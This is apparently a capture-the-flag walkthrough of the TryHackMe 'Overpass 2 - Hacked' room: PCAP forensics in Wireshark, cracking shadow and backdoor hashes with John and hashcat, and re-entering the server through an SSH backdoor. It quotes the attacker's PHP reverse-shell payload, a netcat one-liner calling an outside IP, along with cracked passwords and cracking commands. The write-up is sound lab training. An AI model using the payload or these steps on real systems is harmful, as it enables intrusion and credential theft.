---
title: Overpass 2 - Hacked
date: 2022-06-24 18:00:00 -0500
categories: [Tryhackme, CTF, Walkthrough]
tags: [overpass, pcap, wireshark, hashcat]
---

Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

[https://tryhackme.com/room/overpass2hacked](https://tryhackme.com/room/overpass2hacked)

![0xskar](/assets/wireshark.jpg)

* * *

## Task 1 - Forensics - Analyse the PCAP 

- Can you work out how the attacker got in, and hack your way back into Overpass' production server?

- md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

##   Answer the questions below

**What was the URL of the page they used to upload a reverse shell?**

- checking out wireshark we can see a lot of access to /developments/ and an /upload.php which was used to upload payload.php to /developments/upload/payload.php

**What payload did the attacker use to gain access?**

- inspect the 1026 char POST /development/upload.php

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

**What password did the attacker use to privesc?**

- traverse through wireshark, **follow the TCP Stream**
- james:whenevernoteartinstant

**How did the attacker establish persistence?**

- line 120
- [https://github.com/NinjaJc01/ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor)

**Using the fasttrack wordlist, how many of the system passwords were crackable?**

- find in wireshark (i didnt note the line :sleeping:)

```shell
/etc/shadow
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

- crack the hashes

```shell
┌──(0xskar㉿cocokali)-[~/thm/rooms/overpass2hacked]
└─$ john --format=sha512crypt --wordlist=/usr/share/wordlists/fasttrack.txt etc.shadow.hashes 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)     
4g 0:00:00:00 DONE (2022-06-23 23:00) 6.349g/s 352.3p/s 1761c/s 1761C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

* * *

## Task 2 - Research - Analyse the code 

##   Answer the questions below

**What's the default hash for the backdoor?**

- check https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go
- ``bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3``

**What's the hardcoded salt for the backdoor?**

- 1c362db832f3f864c8c2fe05f2002a05

**What was the hash that the attacker used? - go back to the PCAP for this!**

- Follow TCP Stream - Line 3479
- 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

**Crack the hash using rockyou and a cracking tool of your choice. What's the password?**

- ``hash-identifier`` tells us SHA-512 and the main.go tells us sha512 pass:salt
- ``hashcat -h`` tells us to use 1710 sha512($pass.$salt)
- build command ``hashcat -a 0 -m 1710 attacker.salt.hash /usr/share/seclists/Password/rockyou.txt``
- ``november16``

* * *

## Task 3 Attack - Get back in! 

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

##   Answer the questions below

**The attacker defaced the website. What message did they leave as a heading?**

1. Visit Website
2. H4ck3d by CooctusClan

**Using the information you've found previously, hack your way back in!**

1. SSH backdoor is @ port 2222
2. trying to use SSH returns ``no matching host key type found. Their offer: ssh-rsa``
3. googlfu the answer and adding ``HostKeyAlgorithms +ssh-rsa,ssh-dss`` to ``/etc/ssh_config`` lets us connect with james' password. Now for privesc!

```shell
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
```

**What's the user flag?**

- easy just check home

**What's the root flag?**

- nice of them to leave suid :)

* * * 